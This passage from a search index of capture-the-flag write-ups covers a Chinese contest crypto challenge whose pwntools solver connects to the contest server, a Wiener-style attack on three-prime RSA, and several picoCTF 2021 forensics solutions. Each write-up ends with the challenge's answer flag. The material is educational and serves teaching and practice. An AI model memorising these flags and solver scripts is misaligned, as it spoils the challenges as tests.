\u5e76\u4e14\u5b9e\u9645\u7ed9\u6211\u4eec\u7684\u65f6\u5019\uff0c\u6211\u4eec\u77e5\u9053\u7684\u662f \u7136\u540e \u5e76\u4e14\u628a \u7528 \u52a0\u5bc6\u540e\uff0c\u518d\u5229\u7528\u8fd9\u91cc\u7b97\u51fa\u6765\u7684 \u8fdb\u884c\u4e8c\u6b21\u52a0\u5bc6\u4e4b\u540e\u7684\u7ed3\u679c \u544a\u8bc9\u6211\u4eec\u3002\u9700\u8981\u6211\u4eec\u7ed9\u51fa \u7684\u503c\u3002 \u5982\u679c4\u6b21\u6311\u6218\u6210\u529f\uff0c\u90a3\u4e48oracle\u63d0\u793a\u6211\u4eec\u8fd94\u6b21\u6240\u4ea7\u751f \u7684\u503c\u4e4b\u79ef\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/Cryptography/secret%20share/#_2","text":"\u9996\u5148\u6211\u4eec\u6765\u770b\u8fd9\u4e2a\u5bc6\u7801\u7cfb\u7edf\u7684\u89e3\u5bc6\uff1a\u5047\u8bbe\u6211\u4eec\u6709 \u7684\u8bdd\uff0c\u5bc6\u6587\u53ef\u4ee5\u88ab\u5199\u6210 \u6240\u4ee5 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u89e3\u5f97\u660e\u6587 \u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u770b\u6311\u6218\u3002\u5b9e\u9645\u4e0a\uff0c\u6311\u6218\u5916\u90e8\u53ea\u6709 \u548c \u53c2\u4e0e\u4e86\u8fd0\u7b97\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u6c42\u51fa\u6311\u6218\u4e2d\u7684 \u3002 \u5148\u5bf9\u4e8c\u6b21\u52a0\u5bc6\u7684\u7ed3\u679c\u8fdb\u884c\u5206\u6790\uff1a \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u5df2\u77e5 \u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6a21 \u7684\u9636\u4e3a \u8fd9\u4e00\u6027\u8d28\uff0c\u6c42\u51fa \u548c \uff0c\u8fdb\u800c\u6839\u636e\u4e0a\u9762\u5bc6\u7801\u7cfb\u7edf\u7684\u89e3\u5bc6\u6b65\u9aa4\u89e3\u51fa\u660e\u6587 \uff0c\u5b8c\u6210\u6311\u6218\u3002 \u53c8 \uff0c\u8fd9\u91cc\u6211\u4eec \u662f\u77e5\u9053\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u6c42 \u7684\u503c\u3002 \u4e8b\u5b9e\u4e0a\uff0c \u4e5f\u5c31\u662f\u8bf4 \u6211\u4eec\u4e5f\u662f\u5df2\u77e5\u7684\u3002\u90a3\u4e48\u76f8\u5f53\u4e8e\u8bf4\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u4e00\u4e2a\u591a\u9879\u5f0f \u3002 \u90a3\u4e48 \u6a21 \u7684\u503c\u5c31\u662f \uff01 \u5230\u8fd9\u91cc\uff0c\u6311\u6218\u89e3\u51b3\uff1a\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7b97\u51fa \uff0c\u8fdb\u800c\u7b97\u51fa \u5e76\u89e3\u5bc6\u51fa \uff0c\u5b8c\u6210\u6311\u6218\u3002 \u800c\u6311\u6218\u9001\u6211\u4eec\u7684\u5956\u52b1\u4e5f\u5c31\u662f\u56db\u4e2a \u7684\u4e58\u79ef\uff0c\u800c\u8fd9\u91cc \u662f\u4e0d\u53d8\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7b97\u51fa \uff0c\u7136\u540e\u6a21 \u610f\u4e49\u4e0b\u89e3\u65b9\u7a0b\u5f97\u5230 \uff0c\u8fdb\u800c\u5bf9flag\u5bf9\u5e94\u5bc6\u6587 \u8fdb\u884c\u89e3\u5bc6\u5373\u53ef\u3002 \u641e\u5230\u63d0\u793a\u7684\u4ee3\u7801\u5982\u4e0b\uff1a # sage -python gao_2.py from pwn import * from sage.all import * from Crypto.Util.number import * from hashlib import sha256 def h2(m): return int(sha256(m).hexdigest(), 16) p = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 g = 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 conn = remote('47.104.85.225', 62351) conn.sendlineafter('choice>', '1') conn.recvuntil('Please take good care of it!\\n') s = conn.recvline() y, x = eval(s) conn.sendlineafter('choice>', '2') nlist = [33, 65, 129, 257] for n in nlist: # n = 33 # 33 conn.recvuntil('The cipher shared to you\\n') s = conn.recvline() c, (EE, VV, sr) = eval(s) conn.recvuntil('prefix, encoder = ') s = conn.recvline() encoder, prefix_hex = eval(s) prefix = int(prefix_hex, 16) Y0 = pow(prefix, x, p) P, (xx, ) = PolynomialRing(Zmod(p), 'xx').objgens() f1 = xx ** n for i in range(n): f1 += xx ** (n-i-1) * encoder[i] f2 = xx - Y0 ff = f1 % f2 r = int(ff) d = h2(prefix_hex.decode('hex') + long_to_bytes(r).rjust(64, '\\x00')) | 1 print(d) d2 = inverse(d, p-1) yev = pow(EE * VV, d2, p) m = c * inverse(yev, p) % p conn.sendline(hex(m)[2:]) conn.interactive() \u7136\u540e\u5f97\u5230\u63d0\u793a\u548c\u5bc6\u6587\u3002\u89e3\u5bc6\u7684\u811a\u672c\u5982\u4e0b\uff1a from Crypto.Util.number import * p = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 g = 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 c, (E, V, s) = (5585968041074025086153882651703151644252825797961750029846368850560274818374166788547796736374559756281986206108084144666719010198655069698311903223194165L, (7907022716121671499111670222633646508450620325985407809966619468858884394742418166662560533967841329320157194633470489479583638083109335158547004325407745L, 8405942693799264870593925170154538171389476686350775031149946204774020645560022720688012855017145834685204712310735071692308136544637274001444374071172215L, 4472917796572038030768951841580005906571419088430724545004411546215611452075638469061832923050311132351135006369648270174176244462571628294865215006848977L)) dlist = [88705054545798462592463535140496546230654103298029754196033655251576954884967, 3171548216431031323271233816116991780227219532639047192797048831559660952785, 115398379312678080372309706872824527861787247942202400632537054143103194010615, 85791902547465660732182842994118602329957914363880964530800626818535559558315] rs = 0x17be2ea8187855e3a4ff52657728c70efa4d8d51a9afb3a59fceb1ef85b377613f0271008951a7fcdf741a97892ec4a61c724e49ddb7d46b0e735448d35a1f29L Zp = Zmod(p) d = Zp(1) for x in dlist: d *= x rs = Zp(rs) s = rs * d ^ -1 P.<x> = PolynomialRing(Zp) f = x^4 - s fr = f.roots() c, E, V = map(Zp, (c, E, V)) for x1, po in fr: x1 = int(x1) yev = (E * V) ^ x1 m = c * yev ^ -1 m = int(m) print(long_to_bytes(int(m)).encode('hex'))","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/Cryptography/secret%20share/#flag","text":"flag{504d0411-6707-469b-be31-9868200aca95}","title":"Flag"},{"location":"Writeup/Cryptography/secret%20share/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"Reference"},{"location":"Writeup/Cryptography/simpleRSA/","text":"simpleRSA Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 15 Description Familiar and simple rsa Solution from Crypto.Util.number import *import gmpy2 p, q, r = [getPrime(512) for i in range(3)] n = p * q * r phi = (p - 1) * (q - 1) * (r - 1) d = getPrime(256) e = gmpy2.invert(d , phi) flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" c = pow(bytes_to_long(flag), e, n) print(e, n) print(c) \u4e09\u7d20\u6570\u7684RSA\uff0c\u66fe\u7ecf\u67d0\u4e2a\u6bd4\u8d5b\u8fd8\u8003\u8fc7\u56db\u7d20\u6570\u7684\u3002\u5176\u52a0\u5bc6\u65b9\u5f0f\u548c\u5e38\u89c4RSA\u57fa\u672c\u4e00\u81f4\u76f8\u540c # -*- coding: utf-8 -*- from Crypto.Util.number import long_to_bytes e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452 data = [] while n: data += [e // n] e, n = n, e % n for i in range(1, len(data) + 1): e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 data1 = data[:i] d = 0 d1 = 1 for j in data1[::-1]: d, d1 = d1, d + j * d1 if b'flag' in long_to_bytes(str(pow(c, d, n))): print(long_to_bytes(str(pow(c, d, n)))) Flag flag{1c40fa8a-6a9c-4243-bd83-cd4875ea88cc} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"simpleRSA"},{"location":"Writeup/Cryptography/simpleRSA/#simplersa","text":"Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 15","title":"simpleRSA"},{"location":"Writeup/Cryptography/simpleRSA/#description","text":"Familiar and simple rsa","title":"Description"},{"location":"Writeup/Cryptography/simpleRSA/#solution","text":"from Crypto.Util.number import *import gmpy2 p, q, r = [getPrime(512) for i in range(3)] n = p * q * r phi = (p - 1) * (q - 1) * (r - 1) d = getPrime(256) e = gmpy2.invert(d , phi) flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" c = pow(bytes_to_long(flag), e, n) print(e, n) print(c) \u4e09\u7d20\u6570\u7684RSA\uff0c\u66fe\u7ecf\u67d0\u4e2a\u6bd4\u8d5b\u8fd8\u8003\u8fc7\u56db\u7d20\u6570\u7684\u3002\u5176\u52a0\u5bc6\u65b9\u5f0f\u548c\u5e38\u89c4RSA\u57fa\u672c\u4e00\u81f4\u76f8\u540c # -*- coding: utf-8 -*- from Crypto.Util.number import long_to_bytes e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452 data = [] while n: data += [e // n] e, n = n, e % n for i in range(1, len(data) + 1): e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 data1 = data[:i] d = 0 d1 = 1 for j in data1[::-1]: d, d1 = d1, d + j * d1 if b'flag' in long_to_bytes(str(pow(c, d, n))): print(long_to_bytes(str(pow(c, d, n))))","title":"Solution"},{"location":"Writeup/Cryptography/simpleRSA/#flag","text":"flag{1c40fa8a-6a9c-4243-bd83-cd4875ea88cc}","title":"Flag"},{"location":"Writeup/Cryptography/simpleRSA/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/","text":"Disk, disk, sleuth! II Category: Forensics Source: picoCTF 2021 Author: SYREAL Score: 15 Description All we know is the file with the flag is named down-at-the-bottom.txt ... Disk image: dds2-alpine.flag.img.gz Hints The sleuthkit has some great tools for this challenge as well. Sleuthkit docs here are so helpful: TSK Tool Overview This disk can also be booted with qemu! Approach First the file is zipped. Unzip it with gzip -d dds2-alpine.flag.img After the file is unzipped, the image file should be visible. mmls dds2-alpine.flag.img returned details about the disc image: DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0000262143 0000260096 Linux (0x83) By the way, this video gives a really good overview on how to use The Sleuth Kit. It seems that the first two partitions probably don't have anything interesting in it. Partition at index 002 begins at 2048. I used fls -o 2048 dds2-alpine.flag.img to check the contents of that partition. d/d 11: lost+found r/r 12: .dockerenv d/d 20321: bin d/d 4065: boot d/d 6097: dev d/d 2033: etc d/d 26417: home d/d 8129: lib d/d 14225: media d/d 16257: mnt d/d 18289: opt d/d 16258: proc d/d 18290: root d/d 16259: run d/d 18292: sbin d/d 12222: srv d/d 16260: sys d/d 18369: tmp d/d 12223: usr d/d 14229: var V/V 32513: $OrphanFiles I figured the root directory would be a good starting point. root has control to everything and CTFs store important things in places with admin permissions. fls -o 2048 dds2-alpine.flag.img 18290 : r/r 18291: down-at-the-bottom.txt It took me a while to figure out how to use the icat command but eventually, icat -o 2048 dds2-alpine.flag.img 18291 worked: _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( p ) ( i ) ( c ) ( o ) ( C ) ( T ) ( F ) ( { ) ( f ) ( 0 ) ( r ) ( 3 ) ( n ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( s ) ( 1 ) ( c ) ( 4 ) ( t ) ( 0 ) ( r ) ( _ ) ( n ) ( 0 ) ( v ) ( 1 ) ( c ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( 3 ) ( _ ) ( 6 ) ( 9 ) ( a ) ( b ) ( 1 ) ( d ) ( c ) ( 8 ) ( } ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ Flag picoCTF{f0r3ns1c4t0r_n0v1c3_69ab1dc8} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Disk%2C%20disk%2C%20sleuth!%20II/Disk%2C%20disk%2C%20sleuth!%20II.md","title":"Disk, disk, sleuth! II"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/#disk-disk-sleuth-ii","text":"Category: Forensics Source: picoCTF 2021 Author: SYREAL Score: 15","title":"Disk, disk, sleuth! II"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/#description","text":"All we know is the file with the flag is named down-at-the-bottom.txt ... Disk image: dds2-alpine.flag.img.gz","title":"Description"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/#hints","text":"The sleuthkit has some great tools for this challenge as well. Sleuthkit docs here are so helpful: TSK Tool Overview This disk can also be booted with qemu!","title":"Hints"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/#approach","text":"First the file is zipped. Unzip it with gzip -d dds2-alpine.flag.img After the file is unzipped, the image file should be visible. mmls dds2-alpine.flag.img returned details about the disc image: DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0000262143 0000260096 Linux (0x83) By the way, this video gives a really good overview on how to use The Sleuth Kit. It seems that the first two partitions probably don't have anything interesting in it. Partition at index 002 begins at 2048. I used fls -o 2048 dds2-alpine.flag.img to check the contents of that partition. d/d 11: lost+found r/r 12: .dockerenv d/d 20321: bin d/d 4065: boot d/d 6097: dev d/d 2033: etc d/d 26417: home d/d 8129: lib d/d 14225: media d/d 16257: mnt d/d 18289: opt d/d 16258: proc d/d 18290: root d/d 16259: run d/d 18292: sbin d/d 12222: srv d/d 16260: sys d/d 18369: tmp d/d 12223: usr d/d 14229: var V/V 32513: $OrphanFiles I figured the root directory would be a good starting point. root has control to everything and CTFs store important things in places with admin permissions. fls -o 2048 dds2-alpine.flag.img 18290 : r/r 18291: down-at-the-bottom.txt It took me a while to figure out how to use the icat command but eventually, icat -o 2048 dds2-alpine.flag.img 18291 worked: _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( p ) ( i ) ( c ) ( o ) ( C ) ( T ) ( F ) ( { ) ( f ) ( 0 ) ( r ) ( 3 ) ( n ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( s ) ( 1 ) ( c ) ( 4 ) ( t ) ( 0 ) ( r ) ( _ ) ( n ) ( 0 ) ( v ) ( 1 ) ( c ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( 3 ) ( _ ) ( 6 ) ( 9 ) ( a ) ( b ) ( 1 ) ( d ) ( c ) ( 8 ) ( } ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/","title":"Approach"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/#flag","text":"picoCTF{f0r3ns1c4t0r_n0v1c3_69ab1dc8}","title":"Flag"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Disk%2C%20disk%2C%20sleuth!%20II/Disk%2C%20disk%2C%20sleuth!%20II.md","title":"Reference"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/","text":"Disk, disk, sleuth! Category: Forensics Source: picoCTF 2021 Author: SYREAL Score: 10 Description Use srch_strings from the sleuthkit and some terminal-fu to find a flag in this disk image: dds1-alpine.flag.img.gz Hints Have you ever used file to determine what a file was? Relevant terminal-fu in picoGym: https://play.picoctf.org/practice/challenge/85 Mastering this terminal-fu would enable you to find the flag in a single command: https://play.picoctf.org/practice/challenge/48 Using your own computer, you could use qemu to boot from this disk! Approach Ok for an 100+ pointer question, this was way too easy. The first hint asks if you've ever used file to determine what a file was. I thought this might mean the file extension had been changed to be misleading. file dds1-alpine.flag.img.gz` gave: `dds1-alpine.flag.img.gz: gzip compressed data, was \"dds1-alpine.flag.img\", last modified: Tue Mar 16 00:19:51 2021, from Unix, original size modulo 2^32 134217728 Ok very interesting, it's actually a gzip file meaning the extension is correct. We can unzip it with gzip -d dds1-alpine.flag.img.gz ( -d means decompress aka unzip) A file was extracted from the gzip file. I attempted to open it but that didn't work so I read the next hints. The next hints were pointing to grep and outputing to a file. I thought I might as well try that but wasn't expecting any results. cat dds1-alpine.flag.img|strings|grep pico this gave results. ffffffff81399ccf t pirq_pico_get ffffffff81399cee t pirq_pico_set ffffffff820adb46 t pico_router_probe SAY picoCTF{f0r3ns1c4t0r_n30phyt3_ad5c96c0} Flag picoCTF{f0r3ns1c4t0r_n30phyt3_ad5c96c0} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Disk%2C%20disk%2C%20sleuth!/Disk%2C%20disk%2C%20sleuth!.md","title":"Disk, disk, sleuth!"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/#disk-disk-sleuth","text":"Category: Forensics Source: picoCTF 2021 Author: SYREAL Score: 10","title":"Disk, disk, sleuth!"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/#description","text":"Use srch_strings from the sleuthkit and some terminal-fu to find a flag in this disk image: dds1-alpine.flag.img.gz","title":"Description"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/#hints","text":"Have you ever used file to determine what a file was? Relevant terminal-fu in picoGym: https://play.picoctf.org/practice/challenge/85 Mastering this terminal-fu would enable you to find the flag in a single command: https://play.picoctf.org/practice/challenge/48 Using your own computer, you could use qemu to boot from this disk!","title":"Hints"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/#approach","text":"Ok for an 100+ pointer question, this was way too easy. The first hint asks if you've ever used file to determine what a file was. I thought this might mean the file extension had been changed to be misleading. file dds1-alpine.flag.img.gz` gave: `dds1-alpine.flag.img.gz: gzip compressed data, was \"dds1-alpine.flag.img\", last modified: Tue Mar 16 00:19:51 2021, from Unix, original size modulo 2^32 134217728 Ok very interesting, it's actually a gzip file meaning the extension is correct. We can unzip it with gzip -d dds1-alpine.flag.img.gz ( -d means decompress aka unzip) A file was extracted from the gzip file. I attempted to open it but that didn't work so I read the next hints. The next hints were pointing to grep and outputing to a file. I thought I might as well try that but wasn't expecting any results. cat dds1-alpine.flag.img|strings|grep pico this gave results. ffffffff81399ccf t pirq_pico_get ffffffff81399cee t pirq_pico_set ffffffff820adb46 t pico_router_probe SAY picoCTF{f0r3ns1c4t0r_n30phyt3_ad5c96c0}","title":"Approach"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/#flag","text":"picoCTF{f0r3ns1c4t0r_n30phyt3_ad5c96c0}","title":"Flag"},{"location":"Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Disk%2C%20disk%2C%20sleuth!/Disk%2C%20disk%2C%20sleuth!.md","title":"Reference"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/","text":"MacroHard WeakEdge Category: Forensics Source: picoCTF 2021 Author: MADSTACKS Score: 5 Description I've hidden a flag in this file. Can you find it? Forensics is fun.pptm Hints (None) Approach The best approach to finding files hidden inside other files is binwalk If we perform binwalk \"Forensics is fun.pptm\" we'll see there's a bunch of .zip files. We can extract it using binwalk -e \"Forensics is fun.pptm\" ( -e or --extract for extract) Now there's _Forensics is fun.pptm.extracted folder which I will navigate using 7zip . Since there's too many things in 0.zip I decided I might as well automate the search process. I extracted 0.zip then navigated to it in the terminal. The rest was very guessy, I tried grep -r pico (find recursively) for things like \"pico\" or \"{\" except none of it was useful. I tried find -D tree|grep flag in hopes of finding a flag file which also didn't work. Eventually after some guessing I tried find -D tree|grep hidden which returned: ./ppt/slideMasters/hidden Navigate to cat ./ppt/slideMasters/hidden : Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q This doesn't look like any kind of substitution cipher, might be base 64 so that's worth a try. First we should write a script to get rid of the spaces: s = \"Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q\" s = s.split(\" \") print(\"\".join(s)) This gave \"ZmxhZzogcGljb0NURntEMWRfdV9rbjB3X3BwdHNfcl96MXA1fQ\" which we can then decode using this website Flag picoCTF{D1d_u_kn0w_ppts_r_z1p5} After Thoughts P.S. I didn't know ppts are zips but hey, that's a cool fact Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/MacroHard%20WeakEdge/MacroHard%20WeakEdge.md","title":"MacroHard WeakEdge"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#macrohard-weakedge","text":"Category: Forensics Source: picoCTF 2021 Author: MADSTACKS Score: 5","title":"MacroHard WeakEdge"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#description","text":"I've hidden a flag in this file. Can you find it? Forensics is fun.pptm","title":"Description"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#hints","text":"(None)","title":"Hints"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#approach","text":"The best approach to finding files hidden inside other files is binwalk If we perform binwalk \"Forensics is fun.pptm\" we'll see there's a bunch of .zip files. We can extract it using binwalk -e \"Forensics is fun.pptm\" ( -e or --extract for extract) Now there's _Forensics is fun.pptm.extracted folder which I will navigate using 7zip . Since there's too many things in 0.zip I decided I might as well automate the search process. I extracted 0.zip then navigated to it in the terminal. The rest was very guessy, I tried grep -r pico (find recursively) for things like \"pico\" or \"{\" except none of it was useful. I tried find -D tree|grep flag in hopes of finding a flag file which also didn't work. Eventually after some guessing I tried find -D tree|grep hidden which returned: ./ppt/slideMasters/hidden Navigate to cat ./ppt/slideMasters/hidden : Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q This doesn't look like any kind of substitution cipher, might be base 64 so that's worth a try. First we should write a script to get rid of the spaces: s = \"Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q\" s = s.split(\" \") print(\"\".join(s)) This gave \"ZmxhZzogcGljb0NURntEMWRfdV9rbjB3X3BwdHNfcl96MXA1fQ\" which we can then decode using this website","title":"Approach"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#flag","text":"picoCTF{D1d_u_kn0w_ppts_r_z1p5}","title":"Flag"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#after-thoughts","text":"P.S. I didn't know ppts are zips but hey, that's a cool fact","title":"After Thoughts"},{"location":"Writeup/Forensics/MacroHard%20WeakEdge/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/MacroHard%20WeakEdge/MacroHard%20WeakEdge.md","title":"Reference"},{"location":"Writeup/Forensics/Milkslap/","text":"Milkslap Category: Forensics Source: picoCTF 2021 Author: JAMES LYNCH Score: 10 Description \ud83e\udd5b Hints Look at the problem category Approach Ctrl + shift + I on the website of milkslap and track down where the image is located Use the one and only stegsolve and: Analyze > Data Extract then select Blue 0 and click preview, scroll to the top: Flag picoCTF{imag3_m4n1pul4t10n_sl4p5} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Milkslap/Milkslap.md","title":"Milkslap"},{"location":"Writeup/Forensics/Milkslap/#milkslap","text":"Category: Forensics Source: picoCTF 2021 Author: JAMES LYNCH Score: 10","title":"Milkslap"},{"location":"Writeup/Forensics/Milkslap/#description","text":"\ud83e\udd5b","title":"Description"},{"location":"Writeup/Forensics/Milkslap/#hints","text":"Look at the problem category","title":"Hints"},{"location":"Writeup/Forensics/Milkslap/#approach","text":"Ctrl + shift + I on the website of milkslap and track down where the image is located Use the one and only stegsolve and: Analyze > Data Extract then select Blue 0 and click preview, scroll to the top:","title":"Approach"},{"location":"Writeup/Forensics/Milkslap/#flag","text":"picoCTF{imag3_m4n1pul4t10n_sl4p5}","title":"Flag"},{"location":"Writeup/Forensics/Milkslap/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Milkslap/Milkslap.md","title":"Reference"},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/","text":"Wireshark doo dooo do doo... Category: Forensics Source: picoCTF 2021 Author: DYLAN Score: 5 Description Can you find the flag? 